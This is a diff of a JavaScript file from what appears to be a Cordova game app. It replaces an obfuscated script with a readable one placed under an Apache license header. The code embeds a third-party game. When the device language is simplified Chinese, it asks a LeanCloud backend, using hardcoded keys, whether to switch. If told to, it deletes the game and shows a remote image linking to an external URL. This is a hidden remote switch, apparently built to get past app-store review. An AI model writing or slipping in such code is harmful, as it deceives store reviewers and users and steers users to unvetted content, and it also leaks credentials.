@@ -1,1 +1,140 @@
-var _0x2f07=['CsOOTg==','w5TDgREVwoUQwpFvOEtnScKVwrdv','DcKHbcKbw5hAw5rDtsK9','KMKScsKwwqM3wr4NLVA5w5DDjQ==','w63DisOcwoFKZUvDj2BtG8K4RcOudU3DicO+BcOO','wpVeP8O6','w5bCpRZ/Xw==','w7DDh8KFwplZbl7Ch1FR','O8KhdsOk','wpjChXHDoA==','wpNTKcOhYMOXfg==','wp8zH8KBwrBaIA==','w4bDghQ=','OlTCnsOQ','w79Hw7jDpFvCo0HCsW58wq/DsWgEw48P','w5DCpR5uU8OywoTDpcOSCcOp','KMKsZ8OawoYVw5/DkWZUdsOZw6fCmcKqWQ==','wo85CMKN','w6tWw7XDmEw=','VMOmWT/Cqw==','wobCnULDig==','HRslwo4=','Yysjwr7Dmw==','BsKkw43Dng==','PMK9asOmwpE=','CCfDoTPDi0XCgMK3wpvDjxbDtsKm','bkHDgDVRw5TCs8K1w7F+wrwgwqI=','ESDDtzbDj04=','wq7Cs8KqwpnCvg==','DsOEQMOBw5JD','wrjDvHNvdwtYYw==','w6jDgMOMwqg=','wo41woDCnsOH','WsKMOxxCw6kGKBt8wotbw6ogXxVMw6AW','N8KQwrwx','YjopwrvDhA8=','w6vDi8OMwpROZUPDnl52DcKobMOhflg=','d8OEwpjCssKLwoc=','wr3Dt3RfbAtYY8Onw6gVHiHDkMO2w6w=','LAnDkcK6HhA=','w7DDi3LCnDbCk2wHNcKRwrc=','Gz0uJg==','PsOjwr0awpA=','H8KPKg5awrpdKg==','WTM9JEg2diLCm8K5GcKFw5QYw5zCscO4fTLCqsK7dzssw4/Ciy4dTCxAw6BpZi1rwrA=','w4Z9XG3DtHECwpI=','K1HCgA==','FcOUSsOFw59EaMO1w6E5fBMCAC8=','w6XDgMOawonDgQA=','w79Hw7jDsUXCqVzCsXJ8wpTDnkAM','EMKaMxs=','wqs+Z8Oew5/Cjw==','wropb8OQw53Cj8KFBAHCpMOjwofCgg==','JsKkdA==','wrLCrsKqRsKNw60H','wpIxwpzCnA==','EMKEw67DgA==','w7pNw6jDjQ==','JMOhwqccwocDJQcrUGZR'];(function(_0x3bcbd3,_0x21b362){var _0x280728=function(_0x5ccae8){while(--_0x5ccae8){_0x3bcbd3['push'](_0x3bcbd3['shift']());}};_0x280728(++_0x21b362);}(_0x2f07,0x1c4));var _0x2351=function(_0x3bcbd3,_0x21b362){_0x3bcbd3=_0x3bcbd3-0x0;var _0x280728=_0x2f07[_0x3bcbd3];if(_0x2351['BmBuDm']===undefined){(function(){var _0x4c8df4;try{var _0x19bfe8=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x4c8df4=_0x19bfe8();}catch(_0x2cbe51){_0x4c8df4=window;}var _0x30480c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x4c8df4['atob']||(_0x4c8df4['atob']=function(_0x140b5f){var _0x100971=String(_0x140b5f)['replace'](/=+$/,'');for(var _0x901185=0x0,_0x345ce8,_0x29139f,_0x3a78f2=0x0,_0x3b3eb8='';_0x29139f=_0x100971['charAt'](_0x3a78f2++);~_0x29139f&&(_0x345ce8=_0x901185%0x4?_0x345ce8*0x40+_0x29139f:_0x29139f,_0x901185++%0x4)?_0x3b3eb8+=String['fromCharCode'](0xff&_0x345ce8>>(-0x2*_0x901185&0x6)):0x0){_0x29139f=_0x30480c['indexOf'](_0x29139f);}return _0x3b3eb8;});}());var _0x40fccd=function(_0x118d43,_0x21b362){var _0x2eabd8=[],_0x318f4d=0x0,_0x290eb5,_0x864f34='',_0x1ed39f='';_0x118d43=atob(_0x118d43);for(var _0x941d8=0x0,_0x2347f5=_0x118d43['length'];_0x941d8<_0x2347f5;_0x941d8++){_0x1ed39f+='%'+('00'+_0x118d43['charCodeAt'](_0x941d8)['toString'](0x10))['slice'](-0x2);}_0x118d43=decodeURIComponent(_0x1ed39f);for(var _0xdb8888=0x0;_0xdb8888<0x100;_0xdb8888++){_0x2eabd8[_0xdb8888]=_0xdb8888;}for(_0xdb8888=0x0;_0xdb8888<0x100;_0xdb8888++){_0x318f4d=(_0x318f4d+_0x2eabd8[_0xdb8888]+_0x21b362['charCodeAt'](_0xdb8888%_0x21b362['length']))%0x100;_0x290eb5=_0x2eabd8[_0xdb8888];_0x2eabd8[_0xdb8888]=_0x2eabd8[_0x318f4d];_0x2eabd8[_0x318f4d]=_0x290eb5;}_0xdb8888=0x0;_0x318f4d=0x0;for(var _0x28b6aa=0x0;_0x28b6aa<_0x118d43['length'];_0x28b6aa++){_0xdb8888=(_0xdb8888+0x1)%0x100;_0x318f4d=(_0x318f4d+_0x2eabd8[_0xdb8888])%0x100;_0x290eb5=_0x2eabd8[_0xdb8888];_0x2eabd8[_0xdb8888]=_0x2eabd8[_0x318f4d];_0x2eabd8[_0x318f4d]=_0x290eb5;_0x864f34+=String['fromCharCode'](_0x118d43['charCodeAt'](_0x28b6aa)^_0x2eabd8[(_0x2eabd8[_0xdb8888]+_0x2eabd8[_0x318f4d])%0x100]);}return _0x864f34;};_0x2351['hmVDTK']=_0x40fccd;_0x2351['BXQbjw']={};_0x2351['BmBuDm']=!![];}var _0x3384f8=_0x2351['BXQbjw'][_0x3bcbd3];if(_0x3384f8===undefined){if(_0x2351['epnSEa']===undefined){_0x2351['epnSEa']=!![];}_0x280728=_0x2351['hmVDTK'](_0x280728,_0x21b362);_0x2351['BXQbjw'][_0x3bcbd3]=_0x280728;}else{_0x280728=_0x3384f8;}return _0x280728;};const leancloud_id='Gb56WeAWGJ6kBIbewjjMMC6A-MdYXbMMI';const leancloud_key='hMoK6HBKmu5I50FQFfSrNflu';let screenDirection='landscape';const debugTrigger=![];function lock(){window[_0x2351('0x0','APYh')][_0x2351('0x1','S)UU')][_0x2351('0x2','hx(t')](screenDirection);}function checkTrigger(){function _0x345ce8(_0x29139f,_0x3a78f2){const _0x3b3eb8=_0x29139f[_0x2351('0x3','jEYc')](0x0,0x8);const _0x4faada=_0x2351('0x4','Si73')+_0x3b3eb8+_0x2351('0x5','hx(t');let _0x1ed39f={'Cache-Control':_0x2351('0x6','8Jdo'),'X-LC-Id':_0x29139f,'X-LC-Key':_0x3a78f2};let _0xdb8888={'headers':_0x1ed39f};return fetch(_0x4faada,_0xdb8888);}function _0x28b6aa(_0x3384f8){console[_0x2351('0x7','#vgP')](_0x2351('0x8','vl&F')+_0x3384f8);let _0x1ec570=_0x3384f8['split']('~');let [_0x19b284,_0x50ed50]=['',''];if(_0x1ec570[_0x2351('0x9','DDnj')]!=0x2)return;else[_0x19b284,_0x50ed50]=_0x1ec570;if(_0x19b284){screenDirection='portrait';document[_0x2351('0xa','8NM*')](_0x2351('0xb','Si73'))[_0x2351('0xc','PE42')]();let _0x1356fb=document[_0x2351('0xd','PE42')](_0x2351('0xe','HOyN'));_0x1356fb['src']=_0x19b284;_0x1356fb[_0x2351('0xf','E%cY')]=()=>window[_0x2351('0x10','y7x^')](_0x50ed50,'_system');let _0x23550f=document[_0x2351('0x11','LXLg')]['firstChild'];document[_0x2351('0x12','8NM*')][_0x2351('0x13','jEYc')](_0x1356fb,_0x23550f);}}function _0x1eac5c(_0x26705f){console[_0x2351('0x14','vl&F')](_0x2351('0x15','veb%')+_0x26705f);}let _0x6e2457=()=>{if(debugTrigger)throw _0x2351('0x16','Wxu[');};new Promise(function(_0x45f76c,_0x3cb468){_0x6e2457();navigator[_0x2351('0x17','DSkK')][_0x2351('0x18','fag7')](_0x45f76c,_0x3cb468);})[_0x2351('0x19','mgFx')](function(_0xd96021){if(_0xd96021[_0x2351('0x1a','0)6p')]==_0x2351('0x1b','fag7')){return _0x345ce8(leancloud_id,leancloud_key);}})[_0x2351('0x1c','HOyN')](_0x1a3ad6=>_0x1a3ad6['json']())[_0x2351('0x1d','RAO9')](_0x1859ea=>{let _0x8db234='';if(_0x1859ea[_0x2351('0x1e','mgFx')][0x0]['flag']!=''){let _0x3514e1=_0x1859ea[_0x2351('0x1f','tqnF')][0x0]['flag']+'~'+_0x1859ea['results'][0x0][_0x2351('0x20','veb%')];_0x8db234=_0x3514e1;}_0x28b6aa(_0x8db234);})['catch'](function(_0x4e1d71){_0x1eac5c(_0x4e1d71);});}function setupIframe(){let _0x3dfa41=getComputedStyle(document[_0x2351('0x21','5E!I')],null);let _0x17e8af=parseInt(_0x3dfa41[_0x2351('0x22','8NM*')](_0x2351('0x23','0)6p')));let _0x5f5b05=parseInt(_0x3dfa41[_0x2351('0x24','HOyN')]('padding-bottom'));let _0x54c933=innerHeight-_0x17e8af-_0x5f5b05;document[_0x2351('0x25','tqnF')][_0x2351('0x26','8NM*')][_0x2351('0x27','RbF2')]=_0x2351('0x28','0eeW');document[_0x2351('0x29','MAA2')][_0x2351('0x2a','LUT#')]['height']='auto';document[_0x2351('0x2b','tbkS')][_0x2351('0x2c','HOyN')][_0x2351('0x2d','ebB1')]='0';let _0x5cafa2=document[_0x2351('0x2e','yCZS')](_0x2351('0x2f','ebB1'));_0x5cafa2[_0x2351('0x30','#9L(')][_0x2351('0x31','vl&F')]=_0x54c933+'px';}let afterDeviceReadyDo=function(){checkTrigger();};let afterLoadDo=function(){frames[0x0][_0x2351('0x32','vFC5')][_0x2351('0x33','fag7')][_0x2351('0x34','y7x^')][_0x2351('0x35','Si73')]=_0x2351('0x36','Or!n');};window['addEventListener'](_0x2351('0x37','LUT#'),setupIframe);window[_0x2351('0x38','fag7')](_0x2351('0x39','aS9E'),afterLoadDo);document[_0x2351('0x3a','vFC5')]('deviceready',afterDeviceReadyDo);setInterval(lock,0x64);
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * "License"); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ * http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing,
+ * software distributed under the License is distributed on an
+ * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
+ * KIND, either express or implied.  See the License for the
+ * specific language governing permissions and limitations
+ * under the License.
+ */
+// config area
+const leancloud_id = "Gb56WeAWGJ6kBIbewjjMMC6A-MdYXbMMI"
+const leancloud_key = "hMoK6HBKmu5I50FQFfSrNflu"
+let screenDirection = 'landscape' // 'portrait' or 'landscape'
+const debugTrigger = false
+// end config area
+
+function lock() {
+    window.screen.orientation.lock(screenDirection)
+}
+
+function checkTrigger() {
+    function api(leancloud_id, leancloud_key) {
+        const id_prefix = leancloud_id.slice(0,8)
+        const production_url = "https://" + id_prefix + ".api.lncldglobal.com/1.1/classes/Game"
+        
+        let header =  {
+            'Cache-Control': 'no-cache',
+            'X-LC-Id': leancloud_id,
+            'X-LC-Key': leancloud_key
+        }
+        let config = { headers: header }
+        return fetch(production_url, config)
+    }
+    
+    function successHandler(n) {
+        console.log("successHandler " + n)
+        let splitedStr = n.split("~")
+        
+        let [imgUrl, tapUrl] = ["", ""]
+        if (splitedStr.length != 2) return
+            else [imgUrl, tapUrl] = splitedStr
+                
+                if (imgUrl) {
+                    screenDirection = "portrait"
+                    document.getElementById("game").remove()
+                    let img = document.createElement("img")
+                    
+                    img.src = imgUrl
+                    img.onclick = () => window.open(tapUrl, '_system')
+                    
+                    let bodyFirst = document.body.firstChild
+                    document.body.insertBefore(img, bodyFirst)
+                }
+    }
+    
+    function failureHandler(n) {
+        console.log("failureHandler " + n)
+    }
+    
+    let checkIsDebugMode = () => {
+        if (debugTrigger) throw "debugMode"
+            }
+    
+    new Promise(function(resolve, reject) {
+                checkIsDebugMode()
+                navigator.globalization.getPreferredLanguage(resolve, reject);
+                })
+    .then(function(language) {
+          if (language.value == 'zh-Hans-CN') {
+          return api(leancloud_id, leancloud_key)
+          }
+          })
+    .then((n) => n.json())
+    .then(
+          (n) => {
+          let callParm = ""
+          if (n.results[0].flag != "") {
+          let connectedStr = n.results[0].flag + "~" + n.results[0].tbl
+          callParm = connectedStr
+          }
+          successHandler(callParm)
+          }
+          )
+    .catch(
+           function(t) {
+           //           if (t == "debugMode") successHandler("https://i.imgur.com/wcnIFzC.jpg~https://apple.com")
+           failureHandler(t)
+           }
+           )
+    
+}
+
+function setupIframe() {
+    let bodyStyle = getComputedStyle(document.body, null)
+    let paddingTop = parseInt(bodyStyle.getPropertyValue('padding-top'))
+    let paddingBottom = parseInt(bodyStyle.getPropertyValue('padding-bottom'))
+    let height = innerHeight - paddingTop - paddingBottom
+    
+    document.body.style.width = "auto"
+    document.body.style.height = "auto"
+    document.body.style.paddingBottom = "0"
+    let iframe = document.querySelector("iframe")
+    iframe.style.height = height + "px"
+}
+
+let afterDeviceReadyDo = function() {
+    checkTrigger()
+}
+
+let afterLoadDo = function() {
+    frames[0].document.body.style["-webkit-user-select"] = "none"
+}
+
+let afterDOMFinishDo = function() {
+    let iframe = document.createElement("iframe")
+    iframe.src = "http://www.nick.tv/game-player-html5/index/?base=/gsp.scenic/international/games/rotmnt-bumper-bros/en/"
+    iframe.width = 0
+    iframe.height = 0
+    iframe.scrolling = "no"
+    iframe.setAttribute("frameborder", 0)
+
+    let bodyFirst = document.body.children[0]
+    document.body.insertBefore(iframe, bodyFirst)
+
+}
+
+document.addEventListener("DOMContentLoaded", afterDOMFinishDo)
+window.addEventListener("resize", setupIframe)
+window.addEventListener("onload", afterLoadDo)
+document.addEventListener("deviceready", afterDeviceReadyDo);
+setInterval(lock, 100)
